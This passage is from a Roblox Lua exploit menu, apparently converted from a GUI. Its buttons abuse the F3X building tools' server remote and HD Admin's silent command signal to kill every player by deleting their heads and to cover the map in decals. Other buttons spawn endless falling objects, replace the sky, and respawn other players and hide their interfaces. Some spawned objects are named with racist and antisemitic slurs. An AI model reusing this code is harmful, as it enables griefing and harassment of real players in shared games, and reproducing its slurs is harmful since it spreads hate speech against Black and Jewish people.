			invokeRemote(args)
		end
	
		local function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			invokeRemote(args)
		end
	
		local function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			invokeRemote(args)
		end
	
		local function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			invokeRemote(args)
		end
	
		local function MovePart(part, cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			invokeRemote(args)
		end
	
		local function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			invokeRemote(args)
		end
	
		local function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			invokeRemote(args)
		end
	
		local function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			invokeRemote(args)
		end
	
		local function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			invokeRemote(args)
		end
	
		local function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
			invokeRemote(args)
		end
	
		local function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			invokeRemote(args)
		end
	
		local function Weld(part1, part2, lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			invokeRemote(args)
		end
	
		local function SetLocked(part, boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			invokeRemote(args)
		end
	
		local function SetTrans(part, int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			invokeRemote(args)
		end
	
		local function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			invokeRemote(args)
		end
	
		local function SyncLighting(part, brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			invokeRemote(args)
		end
	
		local function KillAll()
			for _, v in game.Players:GetPlayers() do
				spawn(function()
					if v.Character and v.Character:FindFirstChild("Head") then
						SetLocked(v.Character.Head, false)
						DestroyPart(v.Character.Head)
					end
				end)
			end
		end
	
		KillAll()
	
	
	end)
end;
task.spawn(C_61);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_63()
local script = G2L["63"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local tool
	
		for _, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for _, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function invokeServer(args)
			remote:InvokeServer(unpack(args))
		end
	
		function BigHead(player)
			local char = player.Character
			if char and char:FindFirstChild("Head") and char:FindFirstChild("Humanoid") then
				local head = char.Head
				if head:IsA("BasePart") then
					local existingMesh = head:FindFirstChildOfClass("SpecialMesh")
					if not existingMesh then
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = head
								}
							}
						}
						invokeServer(args)
					end
	
					local meshResizeArgs = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = head,
								["Scale"] = Vector3.new(15, 15, 15)
							}
						}
					}
					invokeServer(meshResizeArgs)
				end
			end
		end
	
		for _, targetPlayer in ipairs(game.Players:GetPlayers()) do
			BigHead(targetPlayer)
		end
	
		game.Players.PlayerAdded:Connect(function(newPlayer)
			newPlayer.CharacterAdded:Connect(function()
				BigHead(newPlayer)
			end)
		end)
	
	end)
end;
task.spawn(C_63);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_65()
local script = G2L["65"];
	script.Parent.MouseButton1Click:Connect(function()
		local Players = game:GetService("Players")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RunService = game:GetService("RunService")
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
	
	
		local tool
	
		local function findSyncAPITool()
			for _, v in pairs(player:GetDescendants()) do
				if v.Name == "SyncAPI" then
					return v.Parent
				end
			end
			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
				if v.Name == "SyncAPI" then
					return v.Parent
				end
			end
		end
	
		tool = findSyncAPITool()
		if not tool then
			warn("SyncAPI tool not found!")
			return
		end
	
	
		local remote = tool.SyncAPI.ServerEndpoint
		local function invoke(args)
			remote:InvokeServer(unpack(args))
		end
	
	
		local function SetCollision(part, boolean)
			invoke({ "SyncCollision", { { Part = part, CanCollide = boolean } } })
		end
	
		local function SetAnchor(part, boolean)
			invoke({ "SyncAnchor", { { Part = part, Anchored = boolean } } })
		end
	
		local function CreatePart(cf, parent)
			invoke({ "CreatePart", "Normal", cf, parent })
		end
	
		local function DestroyPart(part)
			invoke({ "Remove", { part } })
		end
	
		local function MovePart(part, cf)
			invoke({ "SyncMove", { { Part = part, CFrame = cf } } })
		end
	
		local function Resize(part, size, cf)
			invoke({ "SyncResize", { { Part = part, Size = size, CFrame = cf } } })
		end
	
		local function AddMesh(part)
			invoke({ "CreateMeshes", { { Part = part } } })
		end
	
		local function SetMesh(part, meshId)
			invoke({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshId } } })
		end
	
		local function SetTexture(part, texId)
			invoke({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texId } } })
		end
	
		local function SetName(part, name)
			invoke({ "SetName", { part }, name })
		end
	
		local function MeshResize(part, size)
			invoke({ "SyncMesh", { { Part = part, Scale = size } } })
		end
	
		local function Weld(part1, part2, lead)
			invoke({ "CreateWelds", { part1, part2 }, lead })
		end
	
		local function SetLocked(part, boolean)
			invoke({ "SetLocked", { part }, boolean })
		end
	
		local function SetTransparency(part, transparency)
			invoke({ "SyncMaterial", { { Part = part, Transparency = transparency } } })
		end
	
	
		local function CreateSpotlight(part)
			invoke({ "CreateLights", { { Part = part, LightType = "SpotLight" } } })
		end
	
		local function SyncLighting(part, brightness)
			invoke({ "SyncLighting", { { Part = part, LightType = "SpotLight", Brightness = brightness } } })
		end
	
		local function SetColor(part, color)
			invoke({ "SyncColor", { { Part = part, Color = color, UnionColoring = false } } })
		end
	
	
		local function SpawnDecal(part, face)
			invoke({ "CreateTextures", { { Part = part, Face = face, TextureType = "Decal" } } })
		end
	
		local function AddDecal(part, assetId, face)
			invoke({ "SyncTexture", { { Part = part, Face = face, TextureType = "Decal", Texture = "rbxassetid://" .. assetId } } })
		end
	
	
		local function SpamDecal(assetId)
			for _, v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v, false)
						for _, face in pairs(Enum.NormalId:GetEnumItems()) do
							SpawnDecal(v, face)
							AddDecal(v, assetId, face)
						end
					end)
				end
			end
		end
	
		SpamDecal("382332426")
	
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
		function reflect(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Reflectance"] = int
					}
				}
			}
			_(args)
		end
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function MeshColor(part,color)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["VertexColor"] = color
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
	
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function Setmate(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Material"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
	
	
			local function findBuildingTools()
				local player = game:GetService("Players").LocalPlayer
	
				for _, item in ipairs(player.Character:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						return item
					end
				end
	
				for _, item in ipairs(player.Backpack:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						return item
					end
				end
	
				return nil
			end
			local buildingTools = findBuildingTools()
			if not buildingTools then
				warn("btools not found")
				return
			end
	
			local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
			local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
	
			if not serverEndpoint then
				warn("btools not found")
				return
			end
	
			local skyInstance = workspace.Terrain:FindFirstChild("Sky") or workspace:FindFirstChild("Sky")
			if not skyInstance then
	
				print"ok"
			end
			spawn(function()
				DestroyPart(skyInstance)
			end)
			local success, result
			if serverEndpoint:IsA("RemoteFunction") then
				success, result = pcall(function()
					return serverEndpoint:InvokeServer(unpack(args))
				end)
			else
	
				serverEndpoint:FireServer(unpack(args))
				success = true
			end
	
			if success then
	
				print"yay"
	
			end
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			mhm = CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,-5,0)
			v = remote:InvokeServer("CreatePart","Normal",mhm,workspace.Terrain)
			spawn(function()
				rq:InvokeServer(";unfog ;fogcolor black ;time 6")
			end)
			spawn(function()
				SetName(v,"Skybox")
			end)
			spawn(function()
				AddMesh(v)
			end)
			spawn(function()
				SetMesh(v,"111891702759441")
			end)
			spawn(function()
				MeshColor(v,vector.create(4.5,4.5,4.5))
			end)
			spawn(function()
				SetTexture(v,id)
			end)
			spawn(function()
				MeshResize(v,Vector3.new(100000,100000,100000))
			end)
			spawn(function()
				SetLocked(v,true)
			end)
		end
		Sky("382332426")
		
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
	
		function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function CreatePart(cf)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = workspace
			}
			_(args)
		end
	
		function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
			_(args)
		end
	
		function Sky(id)
			local hrp = char:WaitForChild("HumanoidRootPart")
			local cf = hrp.CFrame
			CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)))
			for _, v in workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
					SetAnchor(true, v)
					AddMesh(v)
					SetMesh(v, "14832966960")
					SetTexture(v, id)
					MeshResize(v, Vector3.new(0, 0, 0))
				end
			end
		end
	
		local function createRainToads()
			while true do
				wait(0.001) -- Here they change the appearance time of the Toads or other meshes
				if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
					local hrpcf = player.Character.HumanoidRootPart.CFrame
					local x = hrpcf.x
					local z = hrpcf.z
					local randint = math.random(-600, 600)
					local randint2 = math.random(-600, 600)
					local xloc = randint + x
					local zloc = randint2 + z
					local cf = player.Character.HumanoidRootPart.CFrame.y + 400
	
					spawn(function()
						local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)))
						for i, v in game.Workspace:GetDescendants() do
							if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
								SetName(v, "NOOT NOOT") -- Here the name of the toad changes
								SetAnchor(false, v)
								AddMesh(v)
								Resize(v, Vector3.new(1, 1, 1), v.CFrame)
								MeshResize(v, Vector3.new(400, 400, 400))
								SetMesh(v, "111891702759441") -- Here put it A custom mesh
								SetTexture(v, "382332426") -- X2
								SetCollision(v, true)
								v.Orientation = Vector3.new(0, 0, 0)
	
								v.CFrame = v.CFrame + Vector3.new(0, 0, 0)
	
								local sound = Instance.new("Sound", v)
								sound.SoundId = "rbxassetid://153752123" -- Here the noise or another sound To the toads or other things It works when they appear 
								sound.Volume = 0
								sound.PlayOnRemove = true
								sound:Destroy()
							end
						end
					end)
				else
					wait(1)
				end
			end
		end
	
		coroutine.wrap(createRainToads)()
	
		Sky("95921788891849") -- Here they change the skybox id 
		
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
	
		function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		local function delete(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			remote:InvokeServer(unpack(args))
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
			_(args)
		end
	
		local function particle()
			while true do
				wait(0.2)
				if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
					local hrp = player.Character:FindFirstChild("HumanoidRootPart")
					if not hrp then continue end
	
					local x = hrp.Position.X + math.random(-100, 100)
					local z = hrp.Position.Z + math.random(-100, 100)
					local y = hrp.Position.Y - 35 
	
					local spawnPosition = CFrame.new(x, y, z)
	
					spawn(function()
						CreatePart(spawnPosition, workspace)
	
						wait(0.06)
	
						for _, v in workspace:GetChildren() do
							if v:IsA("Part") and (v.Position - Vector3.new(x, y, z)).Magnitude < 1 then
								local part = v
	
								SetName(part, "black people are threats")
								Resize(part, Vector3.new(100, 100, 0.001), part.CFrame)
								SetCollision(part, false)
								SetTrans(part, 1)
								SetAnchor(true, part)
								part.Orientation = Vector3.new(0, 0, 0)
	
								SpawnDecal(part, Enum.NormalId.Front)
								AddDecal(part, "382332426", Enum.NormalId.Front)
	
								SpawnDecal(part, Enum.NormalId.Back)
								AddDecal(part, "382332426", Enum.NormalId.Back)
	
								local up = 50
								for i = 4, up do
									if part and part.Parent then
										local newCF = part.CFrame + Vector3.new(0, 4, 0)
										Resize(part, part.Size, newCF)
										wait(0.01)
									end
								end
	
								delete(part)
								break
							end
						end
					end)
				else
					wait(1)
				end
			end
		end
	
		coroutine.wrap(particle)()
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";music 119543964108805  ;pitch 0.7 ;volume inf")
	
	
	end)
end;
task.spawn(C_65);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_67()
local script = G2L["67"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
	
		function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function CreatePart(cf)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = workspace
			}
			_(args)
		end
	
		function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
			_(args)
		end
	
		function CreateFire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
			_(args)
		end
	
		function SyncFire(part, size, heat)
			local args = {
				[1] = "SyncDecorate",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire",
						["Size"] = size,
						["Heat"] = heat
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			local hrp = char:WaitForChild("HumanoidRootPart")
			local cf = hrp.CFrame
			CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)))
			for _, v in workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
					SetAnchor(true, v)
					AddMesh(v)
					SetMesh(v, "116114045088190")
					SetTexture(v, id)
					MeshResize(v, Vector3.new(0, 0, 0))
				end
			end
		end
	
		local function createRainToads()
			while true do
				wait(0.01)
				if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
					local hrpcf = player.Character.HumanoidRootPart.CFrame
					local x = hrpcf.x
					local z = hrpcf.z
					local randint = math.random(-600, 600)
					local randint2 = math.random(-600, 600)
					local xloc = randint + x
					local zloc = randint2 + z
					local cf = player.Character.HumanoidRootPart.CFrame.y + 400
	
					spawn(function()
						local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)))
						for i, v in game.Workspace:GetDescendants() do
							if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
								SetName(v, "Gas kikes")
								SetAnchor(false, v)
								AddMesh(v)
								Resize(v, Vector3.new(1, 1, 1), v.CFrame)
								MeshResize(v, Vector3.new(1, 1, 1))
								SetMesh(v, "13623473352")
								SetTexture(v,"13623473461")
								SetCollision(v, true)
								v.Orientation = Vector3.new(0, 0, 0)
								v.CFrame = v.CFrame + Vector3.new(0, 0, 0)
	
								CreateFire(v)
								wait(0.05)
								SyncFire(v, 30, 25)
	
								local sound = Instance.new("Sound", v)
								sound.SoundId = "rbxassetid://153752123"
								sound.Volume = 0
								sound.PlayOnRemove = true
								sound:Destroy()
							end
						end
					end)
				else
					wait(1)
				end
			end
		end
	
		coroutine.wrap(createRainToads)()
	
		Sky("95921788891849")
	end)
end;
task.spawn(C_67);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_69()
local script = G2L["69"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";re others")
		RequestCommand:InvokeServer(";unfly all")
		RequestCommand:InvokeServer(";hideguis others")
		RequestCommand:InvokeServer(";uncmdbar2 others")
	end)
	
end;
task.spawn(C_69);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_6b()
local script = G2L["6b"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand	RequestCommand:InvokeServer(";r6 @") -- U can change all of it with your commands!
	
		RequestCommand:InvokeServer(";buildingTools")
	
		local player = game.Players.LocalPlayer
	
		local character = player.Character or player.CharacterAdded:Wait()
	
		local RunService = game:GetService("RunService")
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
	
		local Players = game:GetService("Players")
	
		local UserInputService = game:GetService("UserInputService")
	
		if not character:FindFirstChild('Accessory (KNIF4ELERFTAccessory)') or character:FindFirstChild("Accessory (Knife McGrabbington III)") then
	
			ready = false
	
			local function notify(msg)
	
				local MainGUI = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI")
	
				if not MainGUI then
	
					MainGUI = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
	
					MainGUI.Name = "MainGUI"
	
				end
	
				coroutine.wrap(function()
	
					for _, v in pairs(MainGUI:GetChildren()) do
	
						if v:IsA("TextLabel") then v:Destroy() end
	
					end
	
					local TextLabel = Instance.new("TextLabel")
	
					local Frame = Instance.new("Frame")
	
					TextLabel.Parent = MainGUI
	
					TextLabel.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	
					TextLabel.BorderSizePixel = 0
	
					TextLabel.Position = UDim2.new(0.2, 0, 0.05, -10)
	
					TextLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
	
					TextLabel.Font = Enum.Font.SourceSans
	
					TextLabel.TextColor3 = Color3.new(1, 1, 1)
	
					TextLabel.TextSize = 35
	
					TextLabel.TextScaled = true
	
